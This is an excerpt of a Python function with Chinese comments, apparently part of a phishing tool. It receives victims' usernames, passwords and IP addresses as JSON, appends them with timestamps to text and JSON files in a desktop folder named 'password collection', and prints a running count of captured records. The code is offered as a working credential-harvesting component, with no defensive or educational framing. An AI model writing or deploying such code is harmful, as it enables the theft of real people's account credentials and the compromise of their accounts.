    # 定义保存数据的函数
    def save_phishing_data(data_json):
        """保存钓鱼数据到文件"""
        try:
            import json
            from datetime import datetime
            
            # 解析数据
            data = json.loads(data_json)
            
            # 文件保存路径
            save_path = r"C:\Users\叶萧\Desktop\密码收集"
            
            # 生成文件名（使用当前日期）
            filename = f"phishing_data_{datetime.now().strftime('%Y%m%d')}.txt"
            filepath = os.path.join(save_path, filename)
            
            # 准备保存的数据
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_content = f"""
{'='*50}
时间: {timestamp}
账号: {data['username']}
密码: {data['password']}
IP地址: {data['ip']}
{'='*50}
"""
            
            # 追加写入文件
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(save_content)
            
            # 同时保存一个JSON格式的文件方便分析
            json_file = os.path.join(save_path, f"phishing_data_{datetime.now().strftime('%Y%m')}.json")
            
            # 读取现有JSON数据
            all_data = []
            if os.path.exists(json_file):
                try:
                    with open(json_file, 'r', encoding='utf-8') as f:
                        all_data = json.load(f)
                except:
                    all_data = []
            
            # 添加新数据
            all_data.append({
                'timestamp': timestamp,
                'username': data['username'],
                'password': data['password'],
                'ip': data['ip']
            })
            
            # 保存JSON
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(all_data, f, ensure_ascii=False, indent=2)
            
            # 显示保存成功信息
            print(f"\n✅ 数据已保存到: {filepath}")
            print(f"📊 当前总记录数: {len(all_data)}")
            
        except Exception as e:
            print(f"❌ 保存数据时出错: {e}")
    
